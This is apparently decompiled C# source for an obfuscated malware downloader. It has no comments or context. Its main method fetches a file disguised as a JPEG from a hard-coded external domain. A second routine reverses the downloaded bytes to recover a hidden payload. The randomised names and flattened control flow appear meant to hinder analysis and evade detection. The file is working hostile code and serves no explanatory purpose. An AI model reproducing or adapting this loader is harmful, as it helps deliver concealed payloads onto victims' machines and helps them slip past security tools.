using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;

namespace PB9xWxUlFdFw5UYQ17;

internal static class ILFiL4AyyYxarv8wcM
{
	private static ILFiL4AyyYxarv8wcM YqhdyLslKBRcRvqefB;

	internal static byte[] ILFAiL4yy()
	{
		return (byte[])Wjcq4OwI68aToBGPJS(PMBq9xWxl("http://thddghdd2.com/Vklwpnk_Fcfagbud.jpg"));
	}

	private static byte[] AxaUrv8wc(byte[] byte_0)
	{
		int num = 14;
		bool flag = default(bool);
		int num3 = default(int);
		Dictionary<int, byte> dictionary = default(Dictionary<int, byte>);
		bool lockTaken = default(bool);
		object obj2 = default(object);
		int num5 = default(int);
		int num7 = default(int);
		byte[] result = default(byte[]);
		while (true)
		{
			object obj = new object();
			int num2 = 7;
			if (!t2gfJtUuWwsYHW4DKH())
			{
				goto IL_002a;
			}
			goto IL_00ed;
			IL_00ed:
			while (true)
			{
				switch (num2)
				{
				case 5:
				case 15:
					flag = num3-- > 0;
					num2 = 4;
					if (t2gfJtUuWwsYHW4DKH())
					{
						continue;
					}
					goto IL_002a;
				case 7:
				case 13:
					dictionary = new Dictionary<int, byte>();
					num2 = 0;
					if (!t2gfJtUuWwsYHW4DKH())
					{
						continue;
					}
					goto case 3;
				case 3:
				case 6:
					num3 = byte_0.Length;
					num2 = 5;
					if (t2gfJtUuWwsYHW4DKH())
					{
						continue;
					}
					goto IL_002a;
				case 12:
					lockTaken = false;
					num2 = 11;
					if (t2gfJtUuWwsYHW4DKH())
					{
						continue;
					}
					goto IL_002a;
				case 11:
					try
					{
						Monitor.Enter(obj2, ref lockTaken);
						dictionary.Add(num3, byte_0[num3]);
						int num4 = 0;
						if (Ov6dYVYUqNDg24MBAI() != null)
						{
							num4 = num5;
						}
						switch (num4)
						{
						}
					}
					finally
					{
						if (lockTaken)
						{
							while (true)
							{
								Monitor.Exit(obj2);
								int num6 = 1;
								if (!t2gfJtUuWwsYHW4DKH())
								{
									num6 = num7;
								}
								switch (num6)
								{
								case 1:
									goto end_IL_00ad;
								}
								continue;
								end_IL_00ad:
								break;
							}
						}
					}
					goto case 5;
				case 4:
				case 10:
					if (flag)
					{
						num = 2;
						goto default;
					}
					goto case 8;
				default:
					obj2 = obj;
					goto case 12;
				case 14:
					break;
				case 8:
				case 16:
					return dictionary.Values.ToArray();
				case 1:
					return result;
				}
				break;
			}
			continue;
			IL_002a:
			num2 = num;
			goto IL_00ed;
		}
	}

	internal static byte[] PMBq9xWxl(string string_0)
	{
		try
		{
			OJgKXdgCNgTHraivB8(SecurityProtocolType.Tls12);
			int num = 0;
			if (!t2gfJtUuWwsYHW4DKH())
			{
				int num2 = default(int);
				num = num2;
			}
			switch (num)
			{
			}
		}
		catch
		{
		}
		HttpWebRequest httpWebRequest = (HttpWebRequest)d972ZYxPQDEDu758K7(string_0);
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		try
		{
			byte[] array = new byte[1024];
			int num3 = 0;
			if (!t2gfJtUuWwsYHW4DKH())
			{
				goto IL_005e;
			}
			goto IL_0076;
			IL_0076:
			MemoryStream object_ = default(MemoryStream);
			switch (num3)
			{
			case 1:
			{
				Stream responseStream = httpWebResponse.GetResponseStream();
				try
				{
					int num4 = 0;
					int num5 = 1;
					if (!t2gfJtUuWwsYHW4DKH())
					{
						goto IL_00b9;
					}
					goto IL_00e9;
					IL_00e9:
					bool flag = default(bool);
					byte[] result = default(byte[]);
					do
					{
						switch (num5)
						{
						case 4:
							goto IL_00a0;
						case 3:
							if (!flag)
							{
								result = (byte[])i4bWRGBQpg9hGdpBel(object_);
								int num6 = 2;
								return result;
							}
							goto case 1;
						case 1:
							num4 = responseStream.Read(array, 0, array.Length);
							goto IL_00a0;
						case 2:
							return result;
						}
						break;
						IL_00a0:
						s6H2K62Ctym3V4YhuI(object_, array, 0, num4);
						num5 = 0;
					}
					while (!t2gfJtUuWwsYHW4DKH());
					goto IL_00b9;
					IL_00b9:
					flag = num4 != 0;
					num5 = 3;
					if (Ov6dYVYUqNDg24MBAI() != null)
					{
						int num6 = default(int);
						num5 = num6;
					}
					goto IL_00e9;
				}
				finally
				{
					if (responseStream != null)
					{
						htPH9i3AuY5RRZ2d9r(responseStream);
						int num7 = 0;
						if (!t2gfJtUuWwsYHW4DKH())
						{
							int num8 = default(int);
							num7 = num8;
						}
						switch (num7)
						{
						}
					}
				}
			}
			}
			goto IL_005e;
			IL_005e:
			object_ = new MemoryStream();
			num3 = 1;
			if (!t2gfJtUuWwsYHW4DKH())
			{
				int num9 = default(int);
				num3 = num9;
			}
			goto IL_0076;
		}
		finally
		{
			if (httpWebResponse != null)
			{
				htPH9i3AuY5RRZ2d9r(httpWebResponse);
				int num10 = 0;
				if (Ov6dYVYUqNDg24MBAI() != null)
				{
					int num11 = default(int);
					num10 = num11;
				}
				switch (num10)
				{
				}
			}
		}
	}

	internal static object Wjcq4OwI68aToBGPJS(object object_0)
	{
		return AxaUrv8wc((byte[])object_0);
	}

	internal static bool t2gfJtUuWwsYHW4DKH()
	{
		return YqhdyLslKBRcRvqefB == null;
	}

	internal static ILFiL4AyyYxarv8wcM Ov6dYVYUqNDg24MBAI()
	{
		return YqhdyLslKBRcRvqefB;
	}

	internal static void OJgKXdgCNgTHraivB8(SecurityProtocolType securityProtocolType_0)
	{
		ServicePointManager.SecurityProtocol = securityProtocolType_0;
	}

	internal static object d972ZYxPQDEDu758K7(object object_0)
	{
		return WebRequest.Create((string)object_0);
	}

	internal static void s6H2K62Ctym3V4YhuI(object object_0, object object_1, int int_0, int int_1)
	{
		((Stream)object_0).Write((byte[])object_1, int_0, int_1);
	}

	internal static object i4bWRGBQpg9hGdpBel(object object_0)
	{
		return ((MemoryStream)object_0).ToArray();
	}

	internal static void htPH9i3AuY5RRZ2d9r(object object_0)
	{
		((IDisposable)object_0).Dispose();
	}
}
